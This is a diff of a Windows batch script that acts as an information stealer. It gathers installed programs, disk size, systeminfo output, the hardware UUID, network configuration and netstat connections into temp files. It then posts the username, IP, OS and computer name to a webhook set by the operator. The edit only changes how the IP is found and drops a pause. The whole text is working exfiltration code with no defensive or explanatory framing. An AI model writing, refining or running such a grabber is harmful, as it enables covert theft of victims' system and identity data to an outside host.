@@ -1,7 +1,6 @@
 @echo off
 set webhook=YOUR_WEBHOOK_HERE
-curl -o %userprofile%\AppData\Local\Temp\ipp.txt https://myexternalip.com/raw
-set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt
+ipconfig | findstr /R /C:"IPv4 Address" > %userprofile%\AppData\Local\Temp\ipp.txt
 powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table" > %userprofile%\AppData\Local\Temp\programms.txt
 echo Hard Drive Space:>%userprofile%\AppData\Local\Temp\System_INFO.txt
 wmic diskdrive get size>>%userprofile%\AppData\Local\Temp\System_INFO.txt
@@ -13,8 +12,6 @@ systeminfo>%userprofile%\AppData\Local\Temp\sysi.txt
 wmic csproduct get uuid >%userprofile%\AppData\Local\Temp\uuid.txt
 ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt
 netstat -an >%userprofile%\AppData\Local\Temp\netstat.txt
-
-timeout 1>nul
 
 curl -X POST -H "Content-type: application/json" --data "{\"content\": \"@everyone ```User = %username%  Ip = %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%
 
